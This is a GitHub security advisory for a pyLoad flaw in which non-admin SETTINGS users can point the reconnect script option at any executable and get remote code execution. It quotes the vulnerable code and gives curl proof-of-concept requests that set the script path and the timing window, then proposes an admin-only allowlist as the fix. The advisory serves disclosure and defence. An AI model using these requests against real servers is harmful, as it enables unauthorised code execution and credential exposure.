# [H] pyLoad SETTINGS Permission Users Can Achieve Remote Code Execution via Unrestricted Reconnect Script Configuration

## Summary
Severity: High
Advisory: GHSA-r7mc-x6x7-cqxx
CVE: CVE-2026-33509
CWE: CWE-269
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-r7mc-x6x7-cqxx
Type: github-advisory

## Affected
- PyPI: `pyload-ng` — affected >=0.4.0

## Details
## Summary

The `set_config_value()` API endpoint allows users with the non-admin `SETTINGS` permission to modify any configuration option without restriction. The `reconnect.script` config option controls a file path that is passed directly to `subprocess.run()` in the thread manager's reconnect logic. A SETTINGS user can set this to any executable file on the system, achieving Remote Code Execution. The only validation in `set_config_value()` is a hardcoded check for `general.storage_folder` — all other security-critical settings including `reconnect.script` are writable without any allowlist or path restriction.

## Details

The vulnerability chain spans two components:

**1. Unrestricted config write — `src/pyload/core/api/__init__.py:210-243`**

```python
@permission(Perms.SETTINGS)
@post
def set_config_value(self, category: str, option: str, value: Any, section: str = "core") -> None:
    self.pyload.addon_manager.dispatch_event(
        "config_changed", category, option, value, section
    )
    if section == "core":
        if category == "general" and option == "storage_folder":
            # Forbid setting the download folder inside dangerous locations
            # ... validation only for storage_folder ...
            return

        self.pyload.config.set(category, option, value)  # No validation for any other option
```

The `Perms.SETTINGS` permission (value 128) is a non-admin permission flag. The only hardcoded validation is for `general.storage_folder`. The `reconnect.script` option is written directly to config with no path validation, allowlist, or sanitization.

**2. Arbitrary script execution — `src/pyload/core/managers/thread_manager.py:157-199`**

```python
def try_reconnect(self):
    if not (
        self.pyload.config.get("reconnect", "enabled")
        and self.pyload.api.is_time_reconnect()
    ):
        return False

    # ... checks if active downloads want reconnect ...

    reconnect_script = self.pyload.config.get("reconnect", "script")
    if not os.path.isfile(reconnect_script):
        self.pyload.config.set("reconnect", "enabled", False)
        self.pyload.log.warning(self._("Reconnect script not found!"))
        return

    # ... reconnect logic ...

    try:
        subprocess.run(reconnect_script)  # Executes attacker-controlled path
    except Exception:
        # ...
```

The `reconnect_script` value comes directly from config. The only check is `os.path.isfile()` — the file must exist but there is no allowlist, no path restriction, and no signature verification.

**3. Attacker also controls timing via same SETTINGS permission**

The attacker can set `reconnect.enabled=True`, `reconnect.start_time`, and `reconnect.end_time` through the same `set_config_value()` endpoint to control when execution occurs. `toggle_reconnect()` at line 321 requires only `Perms.STATUS` — an even lower privilege.

**4. Additional privilege escalation via config access**

Beyond RCE, the same unrestricted config write allows SETTINGS users to:
- Read proxy credentials (`proxy.username`/`proxy.password`) in plaintext via `get_config()`
- Redirect syslog to an attacker-controlled server (`log.syslog_host`/`log.syslog_port`)
- Disable SSL (`webui.use_ssl=False`), rebind to `0.0.0.0` (`webui.host`)
- Modify SSL certificate/key paths to enable MITM

## PoC

**Step 1: Set reconnect script to an attacker-controlled executable**

Via API:
```bash
# Authenticate and get session (as user with SETTINGS permission)
curl -c cookies.txt -X POST 'http://target:8000/api/login' \
  -d 'username=settingsuser&password=pass123'

# Set reconnect script to a known executable on the system
curl -b cookies.txt -X POST 'http://target:8000/api/set_config_value' \
  -d 'category=reconnect&option=script&value=/tmp/exploit.sh&section=core'
```

Via Web UI:
```bash
curl -b cookies.txt -X POST 'http://target:8000/json/save_config?category=core' \
  -d 'reconnect|script=/tmp/exploit.sh&reconnect|enabled=True'
```

**Step 2: Enable reconnect and set timing window**

```bash
curl -b cookies.txt -X POST 'http://target:8000/api/set_config_value' \
  -d 'category=reconnect&option=enabled&value=True&section=core'

curl -b cookies.txt -X POST 'http://target:8000/api/set_config_value' \
  -d 'category=reconnect&option=start_time&value=00:00&section=core'

curl -b cookies.txt -X POST 'http://target:8000/api/set_config_value' \
  -d 'category=reconnect&option=end_time&value=23:59&section=core'
```

**Step 3: Script executes when thread manager calls `try_reconnect()`**

The thread manager's `run()` method (called repeatedly by the core loop) invokes `try_reconnect()`, which calls `subprocess.run(reconnect_script)` at `thread_manager.py:199`.

**Note on exploitation constraints:** The file at the target path must exist (`os.path.isfile()` check) and be executable. With `shell=False` (subprocess.run default), no arguments are passed. If the attacker also has `ADD` permission (common for non-admin users), they can use pyLoad to download an archive containing an executable script, which may retain execute permissions after extraction.

## Impact

- **Remote Code Execution**: A non-admin user with SETTINGS permission can execute arbitrary programs on the server as the pyLoad process user
- **Privilege escalation**: The SETTINGS permission is described as "can access settings" — granting it is not expected to grant arbitrary code execution capability
- **Credential exposure**: SETTINGS users can read proxy credentials, SSL key paths, and other sensitive config values via `get_config()`
- **Network reconfiguration**: SETTINGS users can disable SSL, change bind address, redirect logging, and modify other security-critical network settings

## Recommended Fix

Add an allowlist or category-level restriction in `set_config_value()` that prevents non-admin users from modifying security-critical options:

```python
# In set_config_value(), after the storage_folder check:
ADMIN_ONLY_OPTIONS = {
    ("reconnect", "script"),
    ("webui", "host"),
    ("webui", "use_ssl"),
    ("webui", "ssl_cert"),
    ("webui", "ssl_key"),
    ("log", "syslog_host"),
    ("log", "syslog_port"),
    ("proxy", "username"),
    ("proxy", "password"),
}

if section == "core" and (category, option) in ADMIN_ONLY_OPTIONS:
    # Require ADMIN role for security-critical settings
    if not self.pyload.api.user_data.get("role") == Role.ADMIN:
        raise PermissionError(f"Admin role required to modify {category}.{option}")
```

Additionally, consider validating the `reconnect.script` path against an allowlist of directories or requiring admin approval for script path changes.

## References
- https://github.com/pyload/pyload/security/advisories/GHSA-r7mc-x6x7-cqxx
- https://nvd.nist.gov/vuln/detail/CVE-2026-33509
- https://github.com/pyload/pyload/commit/f5e284fcdfeaf08436bb03e5fcf697aaac659d8b
- https://github.com/pyload/pyload
